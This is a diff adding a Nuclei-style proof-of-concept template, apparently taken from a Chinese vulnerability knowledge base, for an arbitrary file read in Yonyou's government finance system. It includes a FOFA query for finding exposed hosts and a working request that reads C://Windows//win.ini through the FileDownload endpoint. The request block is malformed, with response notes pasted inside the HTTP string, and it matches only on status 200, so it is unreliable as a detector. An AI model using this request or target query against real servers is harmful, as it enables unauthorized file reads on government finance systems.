@@ -1,0 +1,34 @@
+id: poc-yf74rhnz8thla5gh
+info:
+  name: 用友政务财务系统 FileDownload 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yf74rhnz8thla5gh'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yf74rhnz8thla5gh
+    fofa: app="用友-政务财务系统"
+http:
+- raw:
+  - 'GET /bg/attach/FileDownload?execlPath=C://Windows//win.ini HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    support
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
